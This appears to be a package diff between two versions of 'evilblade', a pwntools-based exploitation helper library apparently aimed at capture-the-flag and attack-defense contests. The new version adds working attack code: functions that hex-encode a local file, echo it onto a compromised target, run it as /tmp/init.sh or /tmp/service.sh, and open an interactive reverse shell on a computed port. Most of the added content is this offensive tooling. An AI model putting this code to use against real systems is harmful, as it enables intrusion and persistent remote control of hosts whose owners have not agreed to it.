# Comparing `tmp/evilblade-1.1.7.6.tar.gz` & `tmp/evilblade-1.1.7.7.tar.gz`

## filetype from file(1)

```diff
@@ -1 +1 @@
-gzip compressed data, was "evilblade-1.1.7.6.tar", last modified: Wed Mar 27 10:42:20 2024, max compression
+gzip compressed data, was "evilblade-1.1.7.7.tar", last modified: Sun Apr 21 00:15:23 2024, max compression
```

## Comparing `evilblade-1.1.7.6.tar` & `evilblade-1.1.7.7.tar`

### file list

```diff
@@ -1,14 +1,14 @@
-drwxr-xr-x   0 N1nE      (1000) N1nE      (1000)        0 2024-03-27 10:42:20.129455 evilblade-1.1.7.6/
--rw-r--r--   0 N1nE      (1000) N1nE      (1000)      408 2024-03-27 10:42:20.128455 evilblade-1.1.7.6/PKG-INFO
--rwxrwxrwx   0 N1nE      (1000) N1nE      (1000)      149 2023-12-08 11:58:29.000000 evilblade-1.1.7.6/README.md
-drwxr-xr-x   0 N1nE      (1000) N1nE      (1000)        0 2024-03-27 10:42:20.128455 evilblade-1.1.7.6/evilblade/
--rwxrwxrwx   0 N1nE      (1000) N1nE      (1000)    15149 2024-03-27 10:42:13.000000 evilblade-1.1.7.6/evilblade/__init__.py
--rw-r--r--   0 N1nE      (1000) N1nE      (1000)      794 2024-03-27 10:30:47.000000 evilblade-1.1.7.6/evilblade/a.py
-drwxr-xr-x   0 N1nE      (1000) N1nE      (1000)        0 2024-03-27 10:42:20.128455 evilblade-1.1.7.6/evilblade.egg-info/
--rw-r--r--   0 N1nE      (1000) N1nE      (1000)      408 2024-03-27 10:42:20.000000 evilblade-1.1.7.6/evilblade.egg-info/PKG-INFO
--rwxrwxrwx   0 N1nE      (1000) N1nE      (1000)      219 2024-03-27 10:42:20.000000 evilblade-1.1.7.6/evilblade.egg-info/SOURCES.txt
--rwxrwxrwx   0 N1nE      (1000) N1nE      (1000)        1 2024-03-27 10:42:20.000000 evilblade-1.1.7.6/evilblade.egg-info/dependency_links.txt
--rw-r--r--   0 N1nE      (1000) N1nE      (1000)       22 2024-03-27 10:42:20.000000 evilblade-1.1.7.6/evilblade.egg-info/requires.txt
--rwxrwxrwx   0 N1nE      (1000) N1nE      (1000)       10 2024-03-27 10:42:20.000000 evilblade-1.1.7.6/evilblade.egg-info/top_level.txt
--rw-r--r--   0 N1nE      (1000) N1nE      (1000)       38 2024-03-27 10:42:20.129455 evilblade-1.1.7.6/setup.cfg
--rwxrwxrwx   0 N1nE      (1000) N1nE      (1000)      538 2024-03-27 10:42:19.000000 evilblade-1.1.7.6/setup.py
+drwxr-xr-x   0 N1nE      (1000) N1nE      (1000)        0 2024-04-21 00:15:23.942927 evilblade-1.1.7.7/
+-rw-r--r--   0 N1nE      (1000) N1nE      (1000)      408 2024-04-21 00:15:23.941927 evilblade-1.1.7.7/PKG-INFO
+-rwxrwxrwx   0 N1nE      (1000) N1nE      (1000)      149 2023-12-08 11:58:29.000000 evilblade-1.1.7.7/README.md
+drwxr-xr-x   0 N1nE      (1000) N1nE      (1000)        0 2024-04-21 00:15:23.941927 evilblade-1.1.7.7/evilblade/
+-rwxrwxrwx   0 N1nE      (1000) N1nE      (1000)    16829 2024-04-21 00:12:24.000000 evilblade-1.1.7.7/evilblade/__init__.py
+-rw-r--r--   0 N1nE      (1000) N1nE      (1000)      794 2024-03-27 10:30:47.000000 evilblade-1.1.7.7/evilblade/a.py
+drwxr-xr-x   0 N1nE      (1000) N1nE      (1000)        0 2024-04-21 00:15:23.941927 evilblade-1.1.7.7/evilblade.egg-info/
+-rw-r--r--   0 N1nE      (1000) N1nE      (1000)      408 2024-04-21 00:15:23.000000 evilblade-1.1.7.7/evilblade.egg-info/PKG-INFO
+-rwxrwxrwx   0 N1nE      (1000) N1nE      (1000)      219 2024-04-21 00:15:23.000000 evilblade-1.1.7.7/evilblade.egg-info/SOURCES.txt
+-rwxrwxrwx   0 N1nE      (1000) N1nE      (1000)        1 2024-04-21 00:15:23.000000 evilblade-1.1.7.7/evilblade.egg-info/dependency_links.txt
+-rw-r--r--   0 N1nE      (1000) N1nE      (1000)       22 2024-04-21 00:15:23.000000 evilblade-1.1.7.7/evilblade.egg-info/requires.txt
+-rwxrwxrwx   0 N1nE      (1000) N1nE      (1000)       10 2024-04-21 00:15:23.000000 evilblade-1.1.7.7/evilblade.egg-info/top_level.txt
+-rw-r--r--   0 N1nE      (1000) N1nE      (1000)       38 2024-04-21 00:15:23.942927 evilblade-1.1.7.7/setup.cfg
+-rwxrwxrwx   0 N1nE      (1000) N1nE      (1000)      538 2024-04-21 00:14:54.000000 evilblade-1.1.7.7/setup.py
```

### Comparing `evilblade-1.1.7.6/evilblade/__init__.py` & `evilblade-1.1.7.7/evilblade/__init__.py`

 * *Files 2% similar despite different names*

```diff
@@ -184,18 +184,14 @@
         base -= num
     print('\nloading...')
     dpx("base",base)
     return base
 
 def evgdb(*argv):
     """
-    else:
-        print(f"{GREEN}[+]{END} Found! The appropriate payload size: {min_range-1} (just covering the return address)")
-
-
     Set gdb (evil-gdb)
     """
     p = globals()['p']
     context.terminal = ['alacritty', '-e']
     # Modify terminal as per your environment
     # Replace 'alacritty' with the result of running 'echo $TERM'
     if args.G:
@@ -536,7 +532,77 @@
 
 def congra():
     """
     a congratulation message
     """
     print(f"{GREEN}[+]{END} Pwned! Go ahead")
 
+#awd world
+#千刃破
+def upload(source, dest, ip=0):
+    '''
+    Upload file to the server
+    '''
+    sleep(1)
+    sl('echo "S3vn"')
+    try:
+        ru('S3vn')
+    except:
+        print(f"{RED}[-]{END} Upload Failed")
+        clo()
+        return 0
+    else:
+        print(f"{GREEN}[+]{END} Upload Start")
+    pa = '/bin/echo -ne "'
+    pa += get_file_hex(source, ip)
+    pa += '" > ' + dest
+    dp("Upload File",pa)
+    sl(pa)
+    print(f"{GREEN}[+]{END} Upload Done")
+    return 1
+
+def get_file_hex(source, ip=0):
+    '''
+    In your exploit script, if N1nE is there will be replace to ip + 30000
+    let the N1nE to be the port of reverse shell
+    '''
+    fd = open(source, 'rb')
+    da = fd.read()
+    fd.close()
+    if ip != 0:
+        da = da.replace(b"N1nE", str(int(ip) + 30000).encode())
+    h = ''
+    for c in da:
+        h += '\\x'    
+        h += "%02x" % c
+    return h
+
+def reverse_shell(shell, ip="0", index=3):
+    '''
+    If there is target like 10.10.10.1-10.10.10.127
+    get ip as 1-127 to get the reverse_shell
+    if there is ip, it will be stripped
+    '''
+    if "." in ip:
+        ip = ip.split(".")
+        ip = ip[index]
+
+    if "init" in shell:
+        ip=ip+10000
+        nice = upload(shell,"/tmp/init.sh", ip)
+        if nice == 0:
+            return 0
+        sl("chmod +x /tmp/init.sh && /tmp/init.sh")
+        print(f"{GREEN}[+]{END} Reverse shell in port {int(ip) + 30000} is ready")
+        ia()
+        # sl("exit")
+    else:
+        nice = upload(shell,"/tmp/service.sh", ip)
+        if nice == 0:
+            return 0
+        sl("chmod +x /tmp/service.sh && /tmp/service.sh &")
+        print(f"{GREEN}[+]{END} Reverse shell in port {int(ip) + 30000} is ready")
+        ia()
+    # print(f"{GREEN}[+]{END} Reverse shell in port {int(ip) + 30000} is ready")
+    clo()
+
+
```

### Comparing `evilblade-1.1.7.6/evilblade/a.py` & `evilblade-1.1.7.7/evilblade/a.py`

 * *Files identical despite different names*

### Comparing `evilblade-1.1.7.6/setup.py` & `evilblade-1.1.7.7/setup.py`

 * *Files 20% similar despite different names*

```diff
@@ -1,12 +1,12 @@
 from setuptools import setup
 
 setup(
     name='evilblade',
-    version='1.1.7.6',
+    version='1.1.7.7',
     description='7 N1nEmAn\'s evilblade!!',
     packages=['evilblade'],
     install_requires=[
         'pwntools',
         'LibcSearcher'
     ],
```

